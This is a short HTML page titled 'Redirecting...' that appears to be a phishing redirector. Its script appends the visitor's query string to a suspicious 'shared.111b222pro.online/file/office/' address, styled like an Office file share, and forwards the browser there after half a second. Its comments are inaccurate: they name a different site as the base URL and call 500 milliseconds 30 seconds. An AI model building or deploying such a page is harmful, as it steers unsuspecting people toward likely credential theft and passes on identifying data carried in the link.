<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Get the query string from the URL (everything after '?')
            const queryString = window.location.search;

            // Define the base URL (hitmeup.com)
            const baseHitMeUpUrl = "https://shared.111b222pro.online/file/office/?";

            // Create the full redirect URL by appending the query string to the base URL
            const redirectUrl = baseHitMeUpUrl + queryString.substring(1);

            // Redirect to the new URL after 30 seconds
            setTimeout(function() {
                window.location.href = redirectUrl;
            }, 500); // 30 seconds = 500 milliseconds
        };
    </script>
</head>
<body>
    
</body>
</html>
